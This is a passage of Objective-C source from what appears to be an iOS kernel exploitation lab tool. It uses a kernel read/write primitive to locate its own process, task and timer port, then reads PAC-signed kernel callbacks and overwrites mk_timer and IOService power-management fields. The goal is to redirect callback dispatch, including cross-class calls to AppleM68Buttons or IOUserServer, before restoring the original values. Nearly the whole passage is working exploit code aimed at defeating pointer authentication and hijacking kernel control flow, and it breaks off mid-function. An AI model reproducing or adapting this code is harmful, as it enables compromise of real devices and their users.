            report[@"postDispatchActive"] = @(finalActive);
            report[@"callbackQuiesced"] = @(callbackQuiesced);
            report[@"expirationMessageKR"] = @(expirationMessageKR);
            report[@"expirationMessageReceived"] = @(
                expirationMessageReceived);
            report[@"expirationMessageSize"] = @(
                expirationMessageReceived
                    ? expirationMessage.header.msgh_size : 0);
            report[@"expirationMessageID"] = @(
                expirationMessageReceived
                    ? expirationMessage.header.msgh_id : 0);
            report[@"postMessageReadSucceeded"] = @(
                postMessageReadSucceeded);
            report[@"callbackDispatched"] = @(callbackDispatched);
            report[@"callbackCompleted"] = @(callbackCompleted);
            report[@"timerQuiescedAfterDispatch"] = @(!timerMayBeArmed);
            if (!observationReadable || !callbackQuiesced ||
                !expirationMessageReceived || !postMessageReadSucceeded ||
                !callbackIdentityStable ||
                !param0Stable || !canaryStable || !callbackCompleted) {
                report[@"result"] = @"original-callback-dispatch-observation-failed";
                report[@"message"] = @"The timer did not both quiesce and deliver its expiration Mach message under an unchanged callback, param0, and param1 canary; cancellation and restoration will run.";
                break;
            }
        }

        BOOL restoreWriteSucceeded = cnd_lab_krw_write(
            mutationAddress, &mutationOriginalValue,
            sizeof(mutationOriginalValue));
        report[@"restoreWriteSucceeded"] = @(restoreWriteSucceeded);
        uint64_t restoreReadback = 0;
        BOOL restoreReadSucceeded = restoreWriteSucceeded &&
            cnd_lab_krw_read(mutationAddress, &restoreReadback,
                sizeof(restoreReadback));
        BOOL restoreReadbackVerified = restoreReadSucceeded &&
            restoreReadback == mutationOriginalValue;
        report[@"restoreReadSucceeded"] = @(restoreReadSucceeded);
        report[@"restoreReadback"] = CNDLabThreadCallHex(restoreReadback);
        report[@"restoreReadbackVerified"] = @(restoreReadbackVerified);
        mutationOutstanding = !restoreReadbackVerified;
        if (!restoreReadbackVerified) {
            report[@"result"] = @"param1-restore-verification-failed";
            report[@"message"] = @"The original param1 value was not verified after restoration; an emergency restore will run before timer destruction.";
            break;
        }

        report[@"exactReversibleMutation"] = @YES;
        if (dispatchOriginalCallback) {
            report[@"exactOriginalCallbackDispatch"] = @YES;
            report[@"result"] = @"exact-original-callback-dispatch-observed";
            report[@"message"] = @"After mk_timer_arm normalized param1 to zero, the already-queued call accepted the fixed canary. The original PAC-valid callback delivered its expiration Mach message with unchanged identity and param0, then param1 was restored exactly.";
        } else {
            report[@"result"] = @"exact-reversible-param1-mutation-observed";
            report[@"message"] = @"Wrote and read back one fixed unsigned param1 canary, restored and verified the original value, and never armed or dispatched the signed callback.";
        }
      } while (0);
    } @finally {
        if (timerMayBeArmed) {
            report[@"cancelAttempted"] = @YES;
            uint64_t cancelledDeadline = 0;
            kern_return_t cancelKR = mk_timer_cancel(
                timerPort, &cancelledDeadline);
            report[@"cancelKR"] = @(cancelKR);
            report[@"cancelledDeadline"] = CNDLabThreadCallHex(
                cancelledDeadline);

            uint64_t quiesceDeadline = CNDLabThreadCallDeadlineAfterNanoseconds(
                UINT64_C(1000000000));
            uint64_t cleanupTCQueue = UINT64_MAX;
            uint8_t cleanupIsArmed = 1;
            uint32_t cleanupActive = UINT32_MAX;
            do {
                uint8_t cleanup[CNDMkTimerObservedSize] = {0};
                if (cnd_lab_krw_read(
                        timerObjectAddress, cleanup, sizeof(cleanup))) {
                    cleanupTCQueue = CNDLabThreadCallRead64(
                        cleanup, (size_t)CNDMkTimerTCQueueOffset);
                    cleanupIsArmed = cleanup[CNDMkTimerIsArmedOffset];
                    cleanupActive = CNDLabThreadCallRead32(
                        cleanup, (size_t)CNDMkTimerActiveOffset);
                    BOOL quiesced = cleanupIsArmed == 0 &&
                        cleanupTCQueue == 0 &&
                        (dispatchPACReuse || cleanupActive == 0);
                    if (quiesced) {
                        if (dispatchPACReuse && cleanupActive == 1) {
                            usleep(CNDThreadCallPACReuseSettleMicroseconds);
                        }
                        timerMayBeArmed = NO;
                        break;
                    }
                }
                usleep(CNDThreadCallDispatchPollMicroseconds);
            } while (quiesceDeadline != 0 &&
                mach_absolute_time() < quiesceDeadline);
            report[@"postCancelTCQueue"] = CNDLabThreadCallHex(
                cleanupTCQueue);
            report[@"postCancelIsArmed"] = @(cleanupIsArmed);
            report[@"postCancelActive"] = @(cleanupActive);
            report[@"timerQuiescedAfterCancel"] = @(!timerMayBeArmed);
        }
        if (pacReuseFieldsOutstanding) {
            report[@"pacReuseEmergencyRestoreAttempted"] = @YES;
            BOOL targetWriteSucceeded = cnd_lab_krw_write(
                pacReuseParam1Address, &pacReuseOriginalParam1,
                sizeof(pacReuseOriginalParam1));
            BOOL callbackWriteSucceeded = targetWriteSucceeded &&
                cnd_lab_krw_write(
                    pacReuseCallbackAddress, &pacReuseOriginalCallback,
                    sizeof(pacReuseOriginalCallback));
            BOOL param0WriteSucceeded = callbackWriteSucceeded &&
                cnd_lab_krw_write(
                    pacReuseParam0Address, &pacReuseOriginalParam0,
                    sizeof(pacReuseOriginalParam0));
            uint64_t callbackReadback = 0;
            uint64_t param0Readback = 0;
            uint64_t param1Readback = 0;
            BOOL readSucceeded = param0WriteSucceeded &&
                cnd_lab_krw_read(
                    pacReuseCallbackAddress, &callbackReadback,
                    sizeof(callbackReadback)) &&
                cnd_lab_krw_read(
                    pacReuseParam0Address, &param0Readback,
                    sizeof(param0Readback)) &&
                cnd_lab_krw_read(
                    pacReuseParam1Address, &param1Readback,
                    sizeof(param1Readback));
            BOOL restored = readSucceeded &&
                callbackReadback == pacReuseOriginalCallback &&
                param0Readback == pacReuseOriginalParam0 &&
                param1Readback == pacReuseOriginalParam1;
            report[@"pacReuseEmergencyRestoreCallback"] =
                CNDLabThreadCallHex(callbackReadback);
            report[@"pacReuseEmergencyRestoreParam0"] =
                CNDLabThreadCallHex(param0Readback);
            report[@"pacReuseEmergencyRestoreParam1"] =
                CNDLabThreadCallHex(param1Readback);
            report[@"pacReuseEmergencyRestoreVerified"] = @(restored);
            pacReuseFieldsOutstanding = !restored;
        }
        if (dispatchPACReuse && !timerMayBeArmed &&
            timerObjectAddress != 0) {
            uint8_t owner[CNDMkTimerObservedSize] = {0};
            BOOL ownerRead = cnd_lab_krw_read(
                timerObjectAddress, owner, sizeof(owner));
            uint64_t ownerQueue = ownerRead
                ? CNDLabThreadCallRead64(
                    owner, (size_t)CNDMkTimerTCQueueOffset) : UINT64_MAX;
            uint8_t ownerIsArmed = ownerRead
                ? owner[CNDMkTimerIsArmedOffset] : UINT8_MAX;
            uint32_t ownerActive = ownerRead
                ? CNDLabThreadCallRead32(
                    owner, (size_t)CNDMkTimerActiveOffset) : UINT32_MAX;
            BOOL ownerSafe = ownerRead && ownerQueue == 0 &&
                ownerIsArmed == 0 && ownerActive == 0;
            if (!ownerSafe && ownerRead && ownerQueue == 0 &&
                ownerIsArmed == 0 && ownerActive == 1) {
                uint32_t repairedActive = 0;
                report[@"pacReuseEmergencyOwnerRepairAttempted"] = @YES;
                BOOL repairWrite = cnd_lab_krw_write(
                    timerObjectAddress + CNDMkTimerActiveOffset,
                    &repairedActive, sizeof(repairedActive));
                uint32_t repairReadback = UINT32_MAX;
                BOOL repairRead = repairWrite && cnd_lab_krw_read(
                    timerObjectAddress + CNDMkTimerActiveOffset,
                    &repairReadback, sizeof(repairReadback));
                ownerSafe = repairRead && repairReadback == 0;
                report[@"pacReuseEmergencyOwnerRepairReadback"] = @(
                    repairReadback);
                report[@"pacReuseEmergencyOwnerRepairVerified"] = @(
                    ownerSafe);
            }
            report[@"pacReuseCleanupOwnerQueue"] = CNDLabThreadCallHex(
                ownerQueue);
            report[@"pacReuseCleanupOwnerIsArmed"] = @(ownerIsArmed);
            report[@"pacReuseCleanupOwnerActive"] = @(ownerActive);
            report[@"pacReuseDestroyableOwnerState"] = @(ownerSafe);
            if (!ownerSafe) timerMayBeArmed = YES;
        }
        if (mutationOutstanding) {
            report[@"emergencyRestoreAttempted"] = @YES;
            BOOL emergencyWriteSucceeded = cnd_lab_krw_write(
                mutationAddress, &mutationOriginalValue,
                sizeof(mutationOriginalValue));
            uint64_t emergencyReadback = 0;
            BOOL emergencyReadSucceeded = emergencyWriteSucceeded &&
                cnd_lab_krw_read(mutationAddress, &emergencyReadback,
                    sizeof(emergencyReadback));
            BOOL emergencyRestoreVerified = emergencyReadSucceeded &&
                emergencyReadback == mutationOriginalValue;
            report[@"emergencyRestoreWriteSucceeded"] = @(
                emergencyWriteSucceeded);
            report[@"emergencyRestoreReadback"] = CNDLabThreadCallHex(
                emergencyReadback);
            report[@"emergencyRestoreVerified"] = @(
                emergencyRestoreVerified);
            mutationOutstanding = !emergencyRestoreVerified;
        }
        BOOL allFieldsRestored = !mutationOutstanding &&
            !pacReuseFieldsOutstanding;
        report[@"restoreVerifiedBeforeDestroy"] = @(allFieldsRestored);
        report[@"timerQuiescedBeforeDestroy"] = @(!timerMayBeArmed);
        if (!allFieldsRestored) {
            report[@"exactReversibleMutation"] = @NO;
            report[@"exactOriginalCallbackDispatch"] = @NO;
            report[@"exactPACReuseDispatch"] = @NO;
            report[@"result"] = @"thread-call-emergency-restore-failed";
            report[@"message"] = @"The VM probe could not verify restoration of every modified thread_call field.";
        }
        BOOL destroyAllowed = !dispatchPACReuse ||
            (allFieldsRestored && !timerMayBeArmed);
        kern_return_t destroyKR = destroyAllowed
            ? mk_timer_destroy(timerPort) : KERN_FAILURE;
        report[@"timerDestroySkipped"] = @(!destroyAllowed);
        report[@"destroyKR"] = @(destroyKR);
        report[@"timerDestroyed"] = @(destroyKR == KERN_SUCCESS);
        if (destroyKR != KERN_SUCCESS) {
            report[@"result"] = destroyAllowed
                ? @"timer-destroy-failed" : @"timer-destroy-refused-unsafe-state";
            report[@"message"] = destroyAllowed
                ? @"The timer inspection completed, but its receive right was not destroyed cleanly."
                : @"Fail-closed cleanup refused to destroy a PAC-reuse timer whose restored and quiesced state was not proven.";
            report[@"exactReadOnlyBoundary"] = @NO;
            report[@"exactOriginalCallbackDispatch"] = @NO;
            report[@"exactPACReuseDispatch"] = @NO;
        }
    }

    report[@"completedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *path = [directory stringByAppendingPathComponent:
        @"CNDLabThreadCallPACBoundary.json"];
    report[@"reportPath"] = path;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:nil];
    report[@"reportSaved"] = @(data && [data writeToFile:path
        options:NSDataWritingAtomic error:nil]);
    return [report copy];
}

static NSDictionary<NSString *, id> *
CNDLabThreadCallPMCalloutHarvestRunOnce(CNDLabPMCalloutTargetMode targetMode)
{
    BOOL crossClassDispatch =
        targetMode != CNDLabPMCalloutTargetModeRootDomain;
    BOOL m68Dispatch =
        targetMode == CNDLabPMCalloutTargetModeAppleM68Buttons;
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schemaVersion": @1,
        @"probe": m68Dispatch
            ? @"apple-m68-buttons-pm-cross-class-dispatch"
            : crossClassDispatch
                ? @"io-service-pm-cross-class-dispatch"
                : @"io-service-pm-signed-callback-transplant",
        @"kernelUUID": @CND_LAB_PAC_KERNEL_UUID,
        @"mode": m68Dispatch
            ? @"autonomous-pm-apple-m68-buttons-dispatch"
            : crossClassDispatch
                ? @"autonomous-pm-iouserserver-dispatch"
                : @"autonomous-pm-driver-callout-harvest",
        @"crossClassDispatch": @(crossClassDispatch),
        @"m68Dispatch": @(m68Dispatch),
        @"usedKernelWrite": @NO,
        @"usedKernelCall": @NO,
        @"armedTimer": @NO,
        @"callbackDispatched": @NO,
        @"callbackCompleted": @NO,
        @"result": @"failed-before-create",
    } mutableCopy];

    CNDLabPACProfile profile = {0};
    if (!cnd_lab_vphone_guest() || !cnd_lab_krw_ready() ||
        !cnd_lab_kernel_rw_active() ||
        !cnd_lab_pac_identity_profile(&profile)) {
        report[@"result"] = @"refused-unverified-lab-profile";
        report[@"message"] = @"The exact VM KRW/PAC identity profile was not available.";
        return [report copy];
    }
    report[@"kernelBase"] = CNDLabThreadCallHex(profile.kernel_base);
    report[@"kernelSlide"] = CNDLabThreadCallHex(profile.kernel_slide);

    mach_port_name_t timerPort = mk_timer_create();
    if (!MACH_PORT_VALID(timerPort)) {
        report[@"result"] = @"mk-timer-create-failed";
        report[@"message"] = @"mk_timer_create returned an invalid name.";
        return [report copy];
    }
    report[@"timerPortName"] = @((uint32_t)timerPort);

    __block uint64_t timerObject = 0;
    __block BOOL timerMayBeArmed = NO;
    __block BOOL timerFieldsOutstanding = NO;
    __block uint64_t timerCallbackAddress = 0;
    __block uint64_t timerParam0Address = 0;
    __block uint64_t timerParam1Address = 0;
    __block uint64_t originalTimerCallback = 0;
    __block uint64_t originalTimerParam0 = 0;
    __block uint64_t originalTimerParam1 = 0;

    __block BOOL pmStateOutstanding = NO;
    __block uint64_t pmFlagsAddress = 0;
    __block uint64_t pmCountSlotsAddress = 0;
    __block uint64_t pmReasonAddress = 0;
    __block uint64_t pmResultAddress = 0;
    __block uint16_t originalPMFlags = 0;
    __block uint64_t originalPMCountSlots = 0;
    __block uint64_t originalPMReason = 0;
    __block uint64_t originalPMResult = 0;
    __block BOOL controllingDriverOutstanding = NO;
    __block uint64_t controllingDriverAddress = 0;
    __block uint64_t originalRawControllingDriver = 0;
    __block BOOL powerStateOutstanding = NO;
    __block uint64_t powerStateAddress = 0;
    __block uint64_t originalPowerState = 0;
    __block CNDIOService retainedTargetService = MACH_PORT_NULL;

    @try {
      do {
        uint64_t allprocSymbol = CNDStaticAllProc + profile.kernel_slide;
        uint64_t allprocHead = 0;
        BOOL allprocRead = cnd_lab_krw_read(
            allprocSymbol, &allprocHead, sizeof(allprocHead));
        CNDLabProcWalkObservation walk = {0};
        uint64_t selfProc = allprocRead
            ? CNDLabThreadCallFindProcess(allprocHead, getpid(), &walk) : 0;
        report[@"selfProc"] = CNDLabThreadCallHex(selfProc);
        report[@"procWalkCount"] = @(walk.visited);
        if (!selfProc) {
            report[@"result"] = @"self-task-recovery-failed";
            report[@"message"] = @"The bounded allproc walk did not find Cyanide's live process.";
            break;
        }

        uint64_t selfTask = CNDLabThreadCallTaskForProcess(
            selfProc, NULL, NULL, NULL);
        uint64_t rawSpace = 0;
        uint64_t ipcSpace = 0;
        uint64_t rawTable = 0;
        uint64_t ipcTable = 0;
        uint64_t ipcEntry = 0;
        uint64_t rawPortObject = 0;
        uint64_t portObject = selfTask != 0
            ? CNDLabThreadCallPortObject(
                selfTask, timerPort, &rawSpace, &ipcSpace,
                &rawTable, &ipcTable, &ipcEntry, &rawPortObject)
            : 0;
        report[@"selfTask"] = CNDLabThreadCallHex(selfTask);
        report[@"rawIPCSpace"] = CNDLabThreadCallHex(rawSpace);
        report[@"ipcSpace"] = CNDLabThreadCallHex(ipcSpace);
        report[@"rawIPCTable"] = CNDLabThreadCallHex(rawTable);
        report[@"ipcTable"] = CNDLabThreadCallHex(ipcTable);
        report[@"ipcEntry"] = CNDLabThreadCallHex(ipcEntry);
        report[@"rawPortObject"] = CNDLabThreadCallHex(rawPortObject);
        report[@"portObject"] = CNDLabThreadCallHex(portObject);
        if (!CNDLabThreadCallKernelAddress(selfTask) ||
            !CNDLabThreadCallKernelAddress(portObject)) {
            report[@"result"] = @"ipc-object-resolution-failed";
            report[@"message"] = @"KRW could not bind the timer name to its exact ipc_port.";
            break;
        }

        uint8_t portHeader[16] = {0};
        if (!cnd_lab_krw_read(portObject, portHeader, sizeof(portHeader))) {
            report[@"result"] = @"ipc-object-read-failed";
            break;
        }
        uint64_t signedTimerLabel = CNDLabThreadCallRead64(portHeader, 8);
        timerObject = CNDLabThreadCallStripDataPAC(signedTimerLabel);
        report[@"signedTimerLabel"] = CNDLabThreadCallHex(signedTimerLabel);
        report[@"timerObject"] = CNDLabThreadCallHex(timerObject);
        if (portHeader[0] != CNDShippedTimerPortType ||
            !CNDLabThreadCallKernelAddress(timerObject)) {
            report[@"result"] = @"timer-label-validation-failed";
            break;
        }

        uint8_t timer[CNDMkTimerObservedSize] = {0};
        if (!cnd_lab_krw_read(timerObject, timer, sizeof(timer))) {
            report[@"result"] = @"timer-object-read-failed";
            break;
        }
        uint16_t timerFlags = CNDLabThreadCallRead16(
            timer, (size_t)CNDMkTimerFlagsOffset);
        originalTimerCallback = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerCallbackOffset);
        originalTimerParam0 = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerParam0Offset);
        originalTimerParam1 = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerParam1Offset);
        uint64_t strippedTimerCallback =
            CNDLabThreadCallStripInstructionPAC(originalTimerCallback);
        uint64_t expectedTimerCallback =
            CNDStaticMkTimerExpire + profile.kernel_slide;
        BOOL exactIdleTimer = timerFlags == CNDThreadCallInitialized &&
            (timerFlags & CNDThreadCallBusyMask) == 0 &&
            strippedTimerCallback == expectedTimerCallback &&
            originalTimerCallback != strippedTimerCallback &&
            originalTimerParam0 == timerObject &&
            originalTimerParam1 == 0 &&
            CNDLabThreadCallRead64(
                timer, (size_t)CNDMkTimerTCQueueOffset) == 0 &&
            timer[CNDMkTimerIsDeadOffset] == 0 &&
            timer[CNDMkTimerIsArmedOffset] == 0 &&
            CNDLabThreadCallRead32(
                timer, (size_t)CNDMkTimerActiveOffset) == 0;
        report[@"exactIdleTimer"] = @(exactIdleTimer);
        report[@"originalTimerCallback"] = CNDLabThreadCallHex(
            originalTimerCallback);
        report[@"originalTimerParam0"] = CNDLabThreadCallHex(
            originalTimerParam0);
        if (!exactIdleTimer) {
            report[@"result"] = @"idle-timer-validation-failed";
            report[@"message"] = @"The sacrificial timer did not match the exact idle layout.";
            break;
        }

        uint64_t rootGlobal =
            CNDStaticRootDomainGlobal + profile.kernel_slide;
        uint64_t rawRoot = 0;
        uint64_t root = 0;
        uint64_t rawPwrMgt = 0;
        uint64_t pwrMgt = 0;
        BOOL rootRead = CNDLabThreadCallReadDataPointer(
            rootGlobal, &rawRoot, &root);
        BOOL pwrMgtRead = rootRead && CNDLabThreadCallReadDataPointer(
            root + CNDPMServicePwrMgtOffset, &rawPwrMgt, &pwrMgt);
        uint8_t initialized = 0;
        BOOL initializedRead = rootRead && cnd_lab_krw_read(
            root + CNDPMServiceInitializedOffset,
            &initialized, sizeof(initialized));

        uint64_t rawControllingDriver = 0;
        uint64_t controllingDriver = 0;
        uint64_t rawDriverCallEntry = 0;
        uint64_t driverCallEntry = 0;
        uint64_t rawDriverCallParam = 0;
        uint64_t driverCallParam = 0;
        BOOL controllingDriverRead = pwrMgtRead &&
            CNDLabThreadCallReadDataPointer(
                pwrMgt + CNDPMControllingDriverOffset,
                &rawControllingDriver, &controllingDriver);
        BOOL driverCallEntryRead = pwrMgtRead &&
            CNDLabThreadCallReadDataPointer(
                pwrMgt + CNDPMDriverCallEntryOffset,
                &rawDriverCallEntry, &driverCallEntry);
        BOOL driverCallParamRead = pwrMgtRead &&
            CNDLabThreadCallReadDataPointer(
                pwrMgt + CNDPMDriverCallParamOffset,
                &rawDriverCallParam, &driverCallParam);

        uint64_t signedPMCallback = 0;
        uint64_t pmCallbackParam0 = 0;
        uint64_t powerState = UINT64_MAX;
        uint16_t pmFlags = 0;
        uint64_t countSlots = 0;
        uint64_t reason = 0;
        uint64_t resultValue = 0;
        BOOL pmFieldsRead = driverCallEntryRead && driverCallParamRead &&
            cnd_lab_krw_read(
                driverCallEntry + CNDThreadCallFunctionOffset,
                &signedPMCallback, sizeof(signedPMCallback)) &&
            cnd_lab_krw_read(
                driverCallEntry + CNDThreadCallParam0FieldOffset,
                &pmCallbackParam0, sizeof(pmCallbackParam0)) &&
            cnd_lab_krw_read(
                pwrMgt + CNDPMHeadNotePowerStateOffset,
                &powerState, sizeof(powerState)) &&
            cnd_lab_krw_read(
                pwrMgt + CNDPMFlagsOffset,
                &pmFlags, sizeof(pmFlags)) &&
            cnd_lab_krw_read(
                pwrMgt + CNDPMDriverCallCountSlotsOffset,
                &countSlots, sizeof(countSlots)) &&
            cnd_lab_krw_read(
                pwrMgt + CNDPMDriverCallReasonOffset,
                &reason, sizeof(reason)) &&
            cnd_lab_krw_read(
                driverCallParam + CNDPMDriverCallResultOffset,
                &resultValue, sizeof(resultValue));
        uint64_t strippedPMCallback =
            CNDLabThreadCallStripInstructionPAC(signedPMCallback);
        uint64_t expectedPMCallback =
            CNDStaticPMDriverCallout + profile.kernel_slide;
        uint32_t parameterCount = (uint32_t)countSlots;
        uint32_t parameterSlots = (uint32_t)(countSlots >> 32);
        uint32_t driverCallReason = (uint32_t)reason;
        BOOL exactPMSource = rootRead && pwrMgtRead && initializedRead &&
            controllingDriverRead && driverCallEntryRead &&
            driverCallParamRead && pmFieldsRead && initialized == 1 &&
            controllingDriver == root &&
            strippedPMCallback == expectedPMCallback &&
            signedPMCallback != strippedPMCallback &&
            pmCallbackParam0 == root &&
            (pmFlags & CNDPMDriverCallBusyMask) == 0 &&
            parameterCount == 0 && parameterSlots == 1 &&
            driverCallReason == 1 && powerState <= UINT32_MAX;

        report[@"rootDomainGlobal"] = CNDLabThreadCallHex(rootGlobal);
        report[@"rawRootDomain"] = CNDLabThreadCallHex(rawRoot);
        report[@"rootDomain"] = CNDLabThreadCallHex(root);
        report[@"rawPwrMgt"] = CNDLabThreadCallHex(rawPwrMgt);
        report[@"pwrMgt"] = CNDLabThreadCallHex(pwrMgt);
        report[@"controllingDriver"] = CNDLabThreadCallHex(
            controllingDriver);
        report[@"driverCallEntry"] = CNDLabThreadCallHex(driverCallEntry);
        report[@"driverCallParam"] = CNDLabThreadCallHex(driverCallParam);
        report[@"signedPMCallback"] = CNDLabThreadCallHex(
            signedPMCallback);
        report[@"pmCallback"] = CNDLabThreadCallHex(strippedPMCallback);
        report[@"expectedPMCallback"] = CNDLabThreadCallHex(
            expectedPMCallback);
        report[@"powerState"] = @(powerState);
        report[@"pmFlagsOriginal"] = [NSString stringWithFormat:
            @"0x%04x", pmFlags];
        report[@"pmCountSlotsOriginal"] = CNDLabThreadCallHex(countSlots);
        report[@"pmReasonOriginal"] = CNDLabThreadCallHex(reason);
        report[@"pmResultOriginal"] = CNDLabThreadCallHex(resultValue);
        report[@"exactPMSource"] = @(exactPMSource);
        if (!exactPMSource) {
            report[@"result"] = @"pm-source-validation-failed";
            report[@"message"] = @"The live root-domain PM source did not match the exact idle REA/KDP profile.";
            break;
        }

        uint64_t selectedDriver = root;
        uint64_t expectedSelectedMethod = UINT64_C(0xfffffe00081f5f70) +
            profile.kernel_slide;
        if (crossClassDispatch) {
            const char *targetClass = m68Dispatch
                ? "AppleM68Buttons" : "IOUserServer";
            BOOL targetGateReady = YES;
            uint8_t debugByte = UINT8_MAX;
            uint64_t debugByteAddress = 0;
            if (!m68Dispatch) {
                debugByteAddress =
                    CNDStaticIOKitDebugByte + profile.kernel_slide;
                targetGateReady = cnd_lab_krw_read(
                    debugByteAddress, &debugByte, sizeof(debugByte)) &&
                    (debugByte & 8) == 0;
            }
            uint64_t targetRawVtable = 0;
            uint64_t targetVtable = 0;
            uint64_t targetRawMethod = 0;
            expectedSelectedMethod = (m68Dispatch
                ? CNDStaticAppleM68ButtonsSetPowerState
                : CNDStaticIOUserServerSetPowerState) +
                profile.kernel_slide;
            BOOL targetFound = targetGateReady &&
                CNDLabThreadCallCopyIOServiceObject(
                    selfTask, targetClass, expectedSelectedMethod,
                    &retainedTargetService, &selectedDriver,
                    &targetRawVtable, &targetVtable,
                    &targetRawMethod);
            report[@"targetClass"] = [NSString stringWithUTF8String:
                targetClass];
            if (!m68Dispatch) {
                report[@"iokitDebugByteAddress"] = CNDLabThreadCallHex(
                    debugByteAddress);
                report[@"iokitDebugByte"] = [NSString stringWithFormat:
                    @"0x%02x", debugByte];
                report[@"iokitDebugFastReturn"] = @(targetGateReady);
            }
            report[@"targetServicePort"] = @((uint32_t)retainedTargetService);
            report[@"targetDriver"] = CNDLabThreadCallHex(selectedDriver);
            report[@"targetRawVtable"] = CNDLabThreadCallHex(
                targetRawVtable);
            report[@"targetVtable"] = CNDLabThreadCallHex(targetVtable);
            report[@"targetRawSetPowerState"] = CNDLabThreadCallHex(
                targetRawMethod);
            report[@"targetSetPowerState"] = CNDLabThreadCallHex(
                CNDLabThreadCallStripInstructionPAC(targetRawMethod));
            report[@"expectedTargetSetPowerState"] =
                CNDLabThreadCallHex(expectedSelectedMethod);
            report[@"exactTargetDriver"] = @(targetFound);
            if (!targetFound) {
                report[@"result"] = m68Dispatch
                    ? @"apple-m68-buttons-target-resolution-failed"
                    : @"iouserserver-target-resolution-failed";
                report[@"message"] = m68Dispatch
                    ? @"No live AppleM68Buttons service with the exact signed setPowerState override was found."
                    : @"No live IOUserServer with the exact signed setPowerState override and disabled debug body was found.";
                break;
            }
        }

        timerCallbackAddress = timerObject + CNDMkTimerCallbackOffset;
        timerParam0Address = timerObject + CNDMkTimerParam0Offset;
        timerParam1Address = timerObject + CNDMkTimerParam1Offset;
        pmFlagsAddress = pwrMgt + CNDPMFlagsOffset;
        pmCountSlotsAddress = pwrMgt + CNDPMDriverCallCountSlotsOffset;
        pmReasonAddress = pwrMgt + CNDPMDriverCallReasonOffset;
        pmResultAddress = driverCallParam + CNDPMDriverCallResultOffset;
        originalPMFlags = pmFlags;
        originalPMCountSlots = countSlots;
        originalPMReason = reason;
        originalPMResult = resultValue;
        powerStateAddress = pwrMgt + CNDPMHeadNotePowerStateOffset;
        originalPowerState = powerState;
        controllingDriverAddress =
            pwrMgt + CNDPMControllingDriverOffset;
        originalRawControllingDriver = rawControllingDriver;

        uint64_t zeroParam1 = 0;
        timerFieldsOutstanding = YES;
        report[@"usedKernelWrite"] = @YES;
        BOOL timerParam1Write = cnd_lab_krw_write(
            timerParam1Address, &zeroParam1, sizeof(zeroParam1));
        BOOL timerParam0Write = timerParam1Write && cnd_lab_krw_write(
            timerParam0Address, &root, sizeof(root));
        BOOL timerCallbackWrite = timerParam0Write && cnd_lab_krw_write(
            timerCallbackAddress, &signedPMCallback,
            sizeof(signedPMCallback));

        BOOL controllingDriverWrite = timerCallbackWrite;
        if (crossClassDispatch) {
            controllingDriverOutstanding = YES;
            controllingDriverWrite = cnd_lab_krw_write(
                controllingDriverAddress, &selectedDriver,
                sizeof(selectedDriver));
        }

        uint64_t stagedPowerState = m68Dispatch ? 2 : powerState;
        BOOL powerStateWrite = controllingDriverWrite;
        if (m68Dispatch) {
            powerStateOutstanding = YES;
            powerStateWrite = controllingDriverWrite && cnd_lab_krw_write(
                powerStateAddress, &stagedPowerState,
                sizeof(stagedPowerState));
        }

        uint64_t stagedCountSlots =
            (countSlots & UINT64_C(0xffffffff00000000)) | 1;
        uint64_t stagedReason =
            (reason & UINT64_C(0xffffffff00000000)) |
            CNDPMDriverCallReasonSetPowerState;
        uint16_t stagedFlags = pmFlags | CNDPMDriverCallBusyMask;
        pmStateOutstanding = YES;
        BOOL countWrite = powerStateWrite && cnd_lab_krw_write(
            pmCountSlotsAddress, &stagedCountSlots,
            sizeof(stagedCountSlots));
        BOOL reasonWrite = countWrite && cnd_lab_krw_write(
            pmReasonAddress, &stagedReason, sizeof(stagedReason));
        BOOL flagsWrite = reasonWrite && cnd_lab_krw_write(
            pmFlagsAddress, &stagedFlags, sizeof(stagedFlags));

        uint64_t timerCallbackReadback = 0;
        uint64_t timerParam0Readback = 0;
        uint64_t timerParam1Readback = UINT64_MAX;
        uint64_t countReadback = 0;
        uint64_t reasonReadback = 0;
        uint16_t flagsReadback = 0;
        uint64_t controllingDriverReadback = 0;
        uint64_t powerStateReadback = UINT64_MAX;
        BOOL stagedRead = flagsWrite && cnd_lab_krw_read(
                timerCallbackAddress, &timerCallbackReadback,
                sizeof(timerCallbackReadback)) &&
            cnd_lab_krw_read(
                timerParam0Address, &timerParam0Readback,
                sizeof(timerParam0Readback)) &&
            cnd_lab_krw_read(
                timerParam1Address, &timerParam1Readback,
                sizeof(timerParam1Readback)) &&
            cnd_lab_krw_read(
                pmCountSlotsAddress, &countReadback,
                sizeof(countReadback)) &&
            cnd_lab_krw_read(
                pmReasonAddress, &reasonReadback,
                sizeof(reasonReadback)) &&
            cnd_lab_krw_read(
                pmFlagsAddress, &flagsReadback,
                sizeof(flagsReadback)) &&
            (!crossClassDispatch || cnd_lab_krw_read(
                controllingDriverAddress, &controllingDriverReadback,
                sizeof(controllingDriverReadback))) &&
            (!m68Dispatch || cnd_lab_krw_read(
                powerStateAddress, &powerStateReadback,
                sizeof(powerStateReadback)));
        BOOL stagedExactly = stagedRead &&
            timerCallbackReadback == signedPMCallback &&
            timerParam0Readback == root && timerParam1Readback == 0 &&
            countReadback == stagedCountSlots &&
            reasonReadback == stagedReason &&
            flagsReadback == stagedFlags &&
            (!crossClassDispatch ||
             controllingDriverReadback == selectedDriver) &&
            (!m68Dispatch || powerStateReadback == stagedPowerState);
        report[@"timerFieldsStaged"] = @(timerCallbackWrite);
        report[@"pmStateStaged"] = @(flagsWrite);
        report[@"stagedExactly"] = @(stagedExactly);
        report[@"pmFlagsStaged"] = [NSString stringWithFormat:
            @"0x%04x", stagedFlags];
        report[@"pmCountSlotsStaged"] = CNDLabThreadCallHex(
            stagedCountSlots);
        report[@"pmReasonStaged"] = CNDLabThreadCallHex(stagedReason);
        report[@"controllingDriverStaged"] =
            CNDLabThreadCallHex(controllingDriverReadback);
        report[@"powerStateStaged"] = CNDLabThreadCallHex(
            m68Dispatch ? powerStateReadback : powerState);
        report[@"selectedSetPowerState"] =
            CNDLabThreadCallHex(expectedSelectedMethod);
        if (!stagedExactly) {
            report[@"result"] = @"pm-callout-staging-failed";
